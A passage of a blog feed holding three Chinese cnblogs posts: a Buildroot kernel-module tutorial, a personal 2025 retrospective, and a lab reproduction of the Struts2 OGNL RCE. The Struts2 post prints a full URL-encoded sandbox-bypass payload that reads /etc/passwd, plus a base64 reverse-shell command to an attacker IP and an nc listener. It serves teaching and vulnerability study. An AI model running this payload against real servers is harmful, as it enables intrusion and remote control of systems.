      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19494280\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 22:45\">\n    <span>编写一个Buildroot 驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-驱动模块\">编写一个Buildroot 驱动模块</h1>\n<p>由于Buildroot 不支持ssh</p>\n<p>故采用adb调试</p>\n<h2 id=\"adb连接\">adb连接</h2>\n<h3 id=\"列出设备\">列出设备</h3>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116202202616\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224244254-2021753310.png\" /></p>\n<h3 id=\"连接设备\">连接设备</h3>\n<pre><code>adb shell\n</code></pre>\n<p><img alt=\"image-20260116202213317\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245370-1464333835.png\" /></p>\n<h2 id=\"驱动模块编译交叉编译\">驱动模块编译(交叉编译)</h2>\n<h3 id=\"驱动模块源码\">驱动模块源码</h3>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\nMODULE_VERSION(\"1.0\");                  /* 模块版本，可选 */\nMODULE_DESCRIPTION(\"helloworld Driver\");/* 模块描述，可选，一般用于 lsmod 时显示 */\n</code></pre>\n<p>功能简单解释就是</p>\n<blockquote>\n<p>加载驱动：打印<strong>helloworld_init</strong></p>\n<p>卸载驱动：打印<strong>helloworld_exit</strong></p>\n</blockquote>\n<p>找到交叉编译工具路径</p>\n<pre><code>find prebuilts -name \"*gcc\" -type f\n</code></pre>\n<p><img alt=\"image-20260116221419705\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245922-1390693708.png\" /></p>\n<p>一般在SDK路径下找</p>\n<h3 id=\"配置makefile\">配置Makefile</h3>\n<pre><code class=\"language-makefile\"># 目标架构\n# RK3566 是 ARM64 架构\nARCH ?= arm64\n\n# 交叉编译工具链前缀\n# 最终会使用：aarch64-linux-gnu-gcc / ld / objcopy 等\nCROSS_COMPILE ?= aarch64-linux-gnu-\n\n# Linux 内核源码目录\n# 必须是已经配置并且执行过 prepare/modules_prepare 的内核\n#作用：告诉 Makefile 用哪个内核版本的源码和头文件进行编译链接。\nKDIR := $(HOME)/Desktop/SDK/kernel\n\n# 当前外部模块源码所在目录\n# 内核会在这个目录下查找 obj-m 指定的模块源码\nPWD  := $(shell pwd)\n\n# 要编译的外部内核模块\n# hello_world.c  →  hello_world.ko\nobj-m += hello_world.o\n\n# 默认目标：编译内核模块\nall:\n\t# 调用内核源码目录下的 Makefile\n\t# M=$(PWD) 表示这是一个“外部模块”\n\t# ARCH / CROSS_COMPILE 指定目标架构和交叉编译器\n\t$(MAKE) -C $(KDIR) M=$(PWD) \\\n\t\tARCH=$(ARCH) CROSS_COMPILE=$(CROSS_COMPILE) modules\n\n# 清理编译生成的中间文件\nclean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n\n</code></pre>\n<p>PS：主要寻找配置</p>\n<blockquote>\n<p>交叉编译工具链前缀：aarch64-linux-gnu-</p>\n<p>Linux 内核源码目录路径：$(HOME)/Desktop/SDK/kernel</p>\n</blockquote>\n<h3 id=\"编译\">编译</h3>\n<pre><code>make\n</code></pre>\n<p>模块输出路径</p>\n<p><img alt=\"image-20260116222818781\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224246555-359569486.png\" /></p>\n<h2 id=\"驱动测试\">驱动测试</h2>\n<h3 id=\"将驱动复制进rk3566板卡\">将驱动复制进rk3566板卡</h3>\n<h4 id=\"使用adb\">使用ADB</h4>\n<p>如果ADB已经连上板卡，则先断开连接</p>\n<pre><code>exit\n</code></pre>\n<p>寻找板卡设备</p>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116223436138\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224247234-648064983.png\" /></p>\n<p>将本地的驱动模块文件发送到板卡</p>\n<pre><code>adb -s 6c392aca38ad7c4b push F:\\Desktop\\SSH_Ubuntu18\\hello_world.ko /data/local/tmp/hello_world.ko\n</code></pre>\n<p><img alt=\"image-20260116223652779\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248167-2138743187.png\" /></p>\n<h3 id=\"加载驱动模块\">加载驱动模块：</h3>\n<pre><code>insmod hello_world.ko\t\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223813105\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248958-58986670.png\" /></p>\n<h3 id=\"卸载模块驱动\">卸载模块驱动</h3>\n<pre><code>rmmod hello_world.ko\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223939679\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224249850-1462602200.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 22:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">84</span>)&nbsp;\n评论(<span id=\"post_comment_count\">2</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Apache Struts2 OGNL RCE注入",
      "link": "https://www.cnblogs.com/hzhsec/p/19492577",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/hzhsec/p/19492577\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:02\">\n    <span>Apache Struts2 OGNL RCE注入</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Apache Struts2 OGNL RCE漏洞是一种严重的远程代码执行漏洞，攻击者通过构造恶意的OGNL表达式注入到HTTP请求参数中，利用Struts2框架对OGNL表达式处理不当的缺陷，绕过安全沙箱限制，最终实现在目标服务器上执行任意系统命令，从而获取服务器控制权。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1什么是apache-struts2\">1.什么是Apache Struts2?</h2>\n<p>Apache Struts2（也称为 Struts2）是一个开源的 Java Web 应用框架。<br />\n它主要用于构建企业级 <code>Java EE Web</code> 应用程序，提供 <code>MVC</code>（<code>Model-View-Controller</code>）架构支持，帮助开发者快速开发可维护的 Web 应用。</p>\n<p>Struts2 基于 <code>OGNL</code>（<code>Object-Graph Navigation Language</code>）表达式语言来处理数据绑定、表单验证和动态内容渲染等功能。它是 <code>Struts1</code> 的后继版本，从 2006 年左右开始流行，但由于历史漏洞较多，现在许多项目已转向更现代的框架如 Spring MVC。</p>\n<h2 id=\"2原理\">2.原理</h2>\n<p>(1) <strong>OGNL</strong></p>\n<p><strong>OGNL三要素</strong></p>\n<ol>\n<li>\n<p><strong>Expression（表达式）</strong> 字符串形式的指令，告诉 OGNL “你要做什么”。 例子：<code>user.name</code>、<code>@java.lang.Runtime@getRuntime().exec('calc')</code>、<code>#session.get('user')</code> 等</p>\n</li>\n<li>\n<p><strong>Root（根对象）</strong> 操作的“主体对象”，也就是你主要想访问/修改的对象。 在 Struts2 中，<strong>Root 默认就是 ValueStack（值栈）</strong>，值栈最顶层通常是当前的 Action 实例。 → 访问 Root 对象的属性时，<strong>不需要加任何前缀</strong>，直接写属性名即可。</p>\n</li>\n<li>\n<p><strong>Context（上下文）</strong> 一个 Map 结构（OgnlContext），相当于“运行环境”。 里面存放了各种辅助对象、临时变量、环境信息等。 在 Struts2 中，<strong>Context 就是 ActionContext</strong>，包含了：</p>\n<ul>\n<li><code>#parameters</code>（请求参数）</li>\n<li><code>#request</code></li>\n<li><code>#session</code></li>\n<li><code>#application</code></li>\n<li><code>#attr</code>（依次查找 page→request→session→application）</li>\n<li>值栈本身（作为 Root）<br />\n→ 访问 Context 里的对象，必须加 <strong>#</strong> 前缀，例如 <code>#session.user</code>、<code>#parameters.name</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>OGNL中的重要符号</strong></p>\n<p>有三个<code>#%$</code><br />\n<code>%</code></p>\n<pre><code>%: 其用途是在标志属性为字符串类型时，计算OGNL表达式的值，类似JS中的函数eval()。 \n例如:&lt;s:url value =“%{items.{title}[0]}”/&gt;。获取items对象中title属性，title为数组，取数组索引为0位置的值\n</code></pre>\n<p><code>#</code></p>\n<pre><code>访问 Context（非根对象）里的数据,取 session、request、parameters、application 等时使用\n例如:#session.user #parameters.username #request.get('key')\n</code></pre>\n<p><code>$</code></p>\n<pre><code>1. 在 struts.xml 配置文件里引用 OGNL\n2. 在国际化资源文件（.properties）里引用 OGNL\n例如:struts.xml 里： 资源文件：welcome=${user.name}\n</code></pre>\n<p>(2) <strong>OGNL RCE漏洞原理</strong></p>\n<p>OGNL RCE漏洞是 <code>Struts2</code> 中一类常见的严重安全问题，主要源于框架对 <code>OGNL</code> 表达式的处理不当。</p>\n<p><code>OGNL</code> 是一种强大的表达式语言，用于访问 Java 对象的属性和方法.但在 <code>Struts2</code> 中，如果用户输入（如 <code>HTTP</code> 请求头、参数或标签属性）被直接用于 <code>OGNL</code> 求值，而没有充分验证或转义，就会导致注入攻击。</p>\n<p><strong>漏洞影响范围</strong></p>\n<p>OGNL RCE 漏洞影响了 <code>Struts2</code> 的多个历史版本：</p>\n<ul>\n<li>常见受影响版本：从 <code>Struts 2.0.0</code> 到 <code>2.5.x </code>系列（如 <code>2.5.25</code> 之前），部分 6.x 早期版本有类似问题。但许多旧版本（如 2.3.x）已停止支持（EOL）。<br />\n不是所有 <code>Struts2</code> 应用都易受攻击，取决于配置（如是否使用强制 <code>OGNL</code> 求值或暴露了特定插件）。但遗留系统特别危险。</li>\n</ul>\n<h2 id=\"3漏洞复现\">3.漏洞复现</h2>\n<p>漏洞复现环境<br />\n准备好<code>docker</code></p>\n<ol>\n<li><strong>靶机环境</strong>（使用 vulhub靶场）：</li>\n</ol>\n<pre><code class=\"language-bash\">克隆vulhub仓库\ngit clone --depth 1 https://github.com/vulhub/vulhub.git\n到漏洞地址\ncd vulhub/struts2/s2-061\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-sh\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>再拉取</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>使用docker ps查看镜像是否运行</p>\n<p>访问：<a href=\"http://xn--IP-eo8d177o:8080\" rel=\"noopener nofollow\" target=\"_blank\">http://靶机IP:8080</a><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<ul>\n<li>尝试id注入代码</li>\n</ul>\n<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}\nurl编码\nhttp://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功将id的值更换执行</p>\n<p>尝试poc</p>\n<pre><code>%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]). (#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]). (#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)). (#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)). (#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"cat /etc/passwd\")). (#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n编码:\n%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功读取<code>/etc/passwd</code><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<p>尝试修改命令反弹shell</p>\n<pre><code>shell命令\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\n替换上面的cat命令\n</code></pre>\n<p>攻击机:</p>\n<pre><code>nc -lvvp 4444 启动监听\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n发送payload</p>\n<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p>成功上线:<br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<h3 id=\"poc原理\">poc原理</h3>\n<ol>\n<li>\n<p><strong>获取 Tomcat 的 InstanceManager</strong> <code>#instancemanager</code> = <code>#application[\"org.apache.tomcat.InstanceManager\"]</code> → 从 <code>ServletContext</code>（application）里拿到<code> Tomcat</code> 的实例管理器，它能“暴力”new 出任何类的实例（即使 OGNL 沙箱不允许）。</p>\n</li>\n<li>\n<p><strong>拿到当前的 ValueStack（值栈）</strong> <code>#stack</code> = <code>#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]</code> → 值栈是 <code>Struts2</code> 的核心，里面存着 <code>Action</code>、<code>request</code>、<code>session</code> 等所有上下文信息。</p>\n</li>\n<li>\n<p><strong>用 <code>BeanMap</code> 魔法绕过访问限制</strong>（最核心的沙箱绕过技巧） <code>#bean</code> = <code>#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")</code> <code>#bean.setBean(#stack)</code> → 创建一个 <code>BeanMap</code>（一种能把任意对象当 Map 用的黑科技类），然后把值栈塞进去。 之后就能通过 <code>.get(\"context\")</code>、 <code>.get(\"memberAccess\")</code> 这种方式，访问原本不允许直接访问的私有字段。</p>\n</li>\n</ol>\n<p>继续链式操作： → 先拿到 <code>context</code> → 再拿到 <code>_memberAccess</code>（OGNL 的安全管理器对象，控制什么能执行、什么类被禁止）</p>\n<ol start=\"4\">\n<li>\n<p><strong>清空沙箱黑名单</strong>（真正解除限制） <code>#emptyset = #instancemanager.newInstance(\"java.util.HashSet\") </code> <code>#bean.put(\"excludedClasses\", #emptyset)</code> <code>#bean.put(\"excludedPackageNames\", #emptyset)</code> → 把 OGNL 的两个黑名单（禁止的类 + 禁止的包）全部清空成空集合。 → 从此 OGNL 什么类都能用了，什么包都能访问了（沙箱彻底失效）。</p>\n</li>\n<li>\n<p><strong>准备命令并执行</strong> <code>#arglist</code> = <code>#instancemanager.newInstance(\"java.util.ArrayList\")</code> <code>#arglist.add(\"cat /etc/passwd\")</code> → 创建一个参数列表，里面放要执行的命令。</p>\n</li>\n</ol>\n<p><code>#execute</code> = <code>#instancemanager.newInstance(\"freemarker.template.utility.Execute\") #execute.exec(#arglist)</code> → 用 Freemarker 自带的 Execute 工具类来执行系统命令（这个类本来不允许被 OGNL 调用，但现在沙箱没了，就能用了）。</p>\n<p>**总结： 这个payload 先用 Tomcat InstanceManager + BeanMap 魔法链 → 找到并修改 OGNL 的安全管理器 → 清空所有黑名单 → 最后用 Freemarker 的 Execute 类执行 cat /etc/passwd。</p>\n<h2 id=\"4漏洞防御\">4.<strong>漏洞防御</strong></h2>\n<p>1、升级到Struts 2的安全版本，比如<code>2.3.32</code>或<code>2.5.16</code>，这些版本包含了对应的安全修复<br />\n2、禁用OGNL表达式的执行，或者使用Struts 2的安全<code>mechansim</code>。</p>\n<p><strong>免责声明</strong><br />\n本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。<br />\n<strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。<br />\n作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-01-16 16:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/hzhsec\">hzhsec</a>&nbsp;\n阅读(<span id=\"post_view_count\">38</span>)&nbsp;\n评论(<span id=\"post_comment_count\">2</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海",
      "link": "https://www.cnblogs.com/HaiJun-Aion/p/19492492",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HaiJun-Aion/p/19492492\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 15:50\">\n    <span>我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2025 年，如果让我用一句话定性，我会说：<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>这一年我做了很多事，多到我一度不敢回头看。表面上看，我一直在“往前”：写内容、做项目、跑副业、见人、奔波、搬家、维权、再回上海。可只有我自己知道，真正折磨人的不是忙，是那种反复出现的瞬间——我突然意识到：我不是在冲，我是在<strong>被生活推着跑</strong>。</p>\n<p>我确实拿到了一些结果。内容有过爆的时刻，小红书涨了粉，视频剪辑从手忙脚乱到慢慢顺手，有人开始来问我、信我、甚至愿意付费。那段时间我有一种很罕见的笃定：只要我肯学、肯磨，很多事我都能做成。那种“我好像什么都能做”的自信，在这一年里反复把我从低谷里托起来。</p>\n<p>但同样是这一年，我也交了一笔不轻的学费。不是钱那么简单，更是对人、对机会、对“看起来很美”的承诺的那种天真。我曾因为信任做了一个很重的决定；也曾在北京的夜里把事情一条条摊开算清楚，最后发现不是值不值的问题，而是我再拖下去，就会把自己耗到没样子。</p>\n<p>我不想把这篇复盘写成流水账，也不想写成鸡汤。我只想把这一年最真实的部分摆出来：我怎么一点点变强，怎么被现实教育，怎么止损、怎么维权、怎么把自己从废墟里捡回来。</p>\n<hr />\n<h2 id=\"1-我开始把表达当成一件正事\">1. 我开始把表达当成一件正事</h2>\n<p>三月开始，我把很多注意力放在“说清楚”这件事上。</p>\n<p>以前我也输出，但更多像随手记录。2025 年不一样，我开始认真经营表达：每天钻研、每天尝试、每天复盘。公众号有了更明确的正反馈，有几篇文章突然被推起来，评论区开始出现陌生人的共鸣，后台也开始有人来问我问题。那种感觉很奇妙——我写的东西不再只属于我自己，它开始进入别人的生活。</p>\n<p><strong>今年使用最多的AI IDE 就是Trae，也参加了第一期的Trae 征文活动，获得了第二名，Trae给我来了很多成长。</strong></p>\n<h3 id=\"今年在trae-方面的实践\">今年在Trae 方面的实践：</h3>\n<ol>\n<li><a href=\"https://juejin.cn/post/7462542925915848744\" rel=\"noopener nofollow\" target=\"_blank\">字节跳动推出AI编程神器Trae，基于Trae 从 0 开发一个Google 插件！</a><br />\n<img alt=\"image\" class=\"lazyload\" /></li>\n</ol>\n <hr /> \n<hr /> \n<p>2.<a href=\"https://github.com/TickHaiJun/Dompet-App-React-Native\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 开发的第一个APP</a></p>\n<p>Trae 刚出来Claude模型时，连夜测评它的能力，当时花了5个小时搞出一个App，项目并且还开源了<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<ol start=\"3\">\n<li><a href=\"https://github.com/TickHaiJun/Podcast\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 设计的原型稿</a></li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我也开始碰视频。说实话，一开始很狼狈：剪一个一分钟的视频，要花我两三个小时。卡点、配乐、字幕、节奏，哪一样都不像看起来那么简单。我一度怀疑是不是我不适合，但又不甘心。我知道这是一块我之前没尝试过的能力，一旦练出来，就是新的路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae还做了原型还原设计稿，没想到视频火了</a><br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这一段给我的礼物，是一种更稳定的自信：很多事看起来复杂，只要拆开、一步步做，就会变得可控。</p>\n<hr />\n<h2 id=\"2-我把想法做成了作品通过vibe-coding\">2. 我把想法做成了作品通过Vibe Coding</h2>\n<p>五月到八月，我进入了一种“手里有活”的状态。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect\" rel=\"noopener nofollow\" target=\"_blank\">从懵懂到落地：记录我们第一次成功将大模型“塞”进业务的曲折历程</a></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>年初做了自己第一款AI应用</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那段时间我做了很多作品，也开源了不少东西。说白了，就是把想法从脑子里拎出来，做成一个能跑、能看、能用、能被别人理解的东西。</p>\n<p>与此同时，我也给团队做了多次分享，讲我最近在做什么、怎么做、踩了什么坑、怎么绕开。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>中间有两次机会我印象很深：一次是来自一家很大的咨询公司，一次是出海方向的远程邀请。它们都挺诱人，但我当时都拒绝了。原因很简单：我知道我还没准备好。能力没到那个厚度、心态没到那个稳定度，我不想靠运气上去，然后靠硬扛撑住。</p>\n<p>也有一些小小的惊喜：有人买了我做的东西，虽然数量不算多，但足够让我确认——我做的东西不是自嗨，是真的有人需要。更重要的是，越来越多的网友通过我的内容认识我，联系我，问我问题。</p>\n<p>那几个月我最大的收获不是“做了多少”，而是一个更朴素的结论：<strong>想法不值钱，做出来才值钱。</strong></p>\n<hr />\n<h2 id=\"3-有人愿意为我的能力买单\">3. 有人愿意为我的能力买单</h2>\n<p>九月到十一月，我的副业开始像一门“正经事”。</p>\n<p>咨询变多了。有的是临时问答，有的是更系统的陪跑。我接了三份陪跑，也因此认识了几位很投缘的朋友，都是山西的。我们聊项目、聊选择、聊怎么把事情做成，也聊怎么在现实里不把自己弄丢。</p>\n<p>这份关系很珍贵。它不是那种互相吹捧的热闹，而是我能明显感到：对方因为我的建议少走了弯路，事情推进得更顺，而我也因为对方的反馈变得更坚定。那种“我真的帮到了人”的成就感，比数字更实在。</p>\n<p>我也在这一段第一次更清晰地看到我的位置：我不是只能埋头做项目的人，我还可以把经验讲清楚，把复杂拆简单，把别人卡住的点指出来。这是一种能力，也是一种责任感。</p>\n<p>这一段让我相信：靠自己攒出来的口碑，慢，但稳。</p>\n<hr />\n<h2 id=\"4-我重新确认了钱该花在哪\">4. 我重新确认了“钱该花在哪”</h2>\n<p>国庆我和家人自驾出去玩了一趟。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>风很大，天很高，羊肉很香。我们在草原上待了一天，我给父母安排了越野卡丁车，让他们在草地上跑一圈；我和姐姐骑了马，笑得像回到小时候。那几天我很放松，甚至有点恍惚——原来我努力这么久，最想换来的并不是某个头衔，而是这种“我能让他们开心”的底气。</p>\n<p>我以前对花钱很谨慎，总觉得要攒着、要算计回报。可当我把钱花在家人身上，那种舒坦很直接：不需要证明，不需要解释，花出去就是一种“我扛得住了”的确认。</p>\n<hr />\n<h2 id=\"5-去北京一趟我把胆子捡了回来\">5. 去北京一趟，我把胆子捡了回来</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十月我去北京参加了一个活动，也算第一次为了这类事出远门。2026年，多输出AI，多参加活动。</p>\n<p>现场人很多，节奏很快，信息密得让人喘不过气。那天我最大的感受，不是见了什么产品，而是突然明白：机会真的会从我身边走过去，走过去就没了。很多时候不是我不够好，是我不敢站出来，或者我下意识觉得“我还不够格”。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>去天津路上，熟悉的感觉</p>\n<p>我也去了天津，见了老朋友老李。我们聊了一整天，我帮他搬运整理食品，他带我吃了天津菜，甚至让我体验了一把保时捷 911。最后他把我送到机场。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一天让我很感慨：这个世界其实很大，也很活，我不能总把自己困在“怕麻烦、怕尴尬、怕出丑”的情绪里。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>今年我也买了不少书，也读了不少书。《亲密关系》《认知驱动》《纳瓦尔宝典》……它们没有给我标准答案，但给了我更清醒的视角：我要对自己的情绪负责，对自己的选择负责，对自己的长期负责。</p>\n<hr />\n<h2 id=\"6-我相信过他也因此完成了一次祛魅\">6. 我相信过他，也因此完成了一次祛魅</h2>\n<p>十一月底，我做了一个很重的决定：离职，去北京试一次。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这件事我并不是冲动。相反，我想了将近一个月。朋友“他”邀请过我三次，前两次我都拒绝了。第三次创始人亲自找我，话说得很漂亮，未来画得很大，而我也确实在那个阶段渴望一次更大的空间。再加上对“他”的信任，我最终点了头。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>离开前，我做了一件我很想做的事：把爸爸接到上海。那是他第一次来上海，也是他第一次坐飞机。我去接他的时候，他脸上的喜悦藏不住。我带他逛了很多地方，拍了很多照片。送他去机场那天，我心里很踏实——那种成就感，不来自任何评价，只来自“我能带他看世界”的瞬间。</p>\n<p>今年我也给妈妈买了新手机，她之前那部太卡了。再小的事情，落在父母身上都是实在的改变。</p>\n<p>然后我去了北京。</p>\n<p>现实很快给了我一记闷棍。之前说的和实际差太多太多。我会在很短时间内发现：有些话只是话，有些承诺只是情绪，有些“格局”只是包装。我不想在这里写具体细节，但我可以写结论——这次经历让我完成了一次祛魅：对人、对所谓“机会”、对“看起来很美”的未来。</p>\n<p>我也更清楚了一件事：我并不是不能吃苦，我是不愿意把我的尊严和时间押在不靠谱的人和不靠谱的事上。</p>\n<hr />\n<h2 id=\"7-我救了三只狗也被这座城市的善意接住\">7. 我救了三只狗，也被这座城市的善意接住</h2>\n<p>这一年我救了三只狗。<br />\n<img alt=\"image\" class=\"lazyload\" 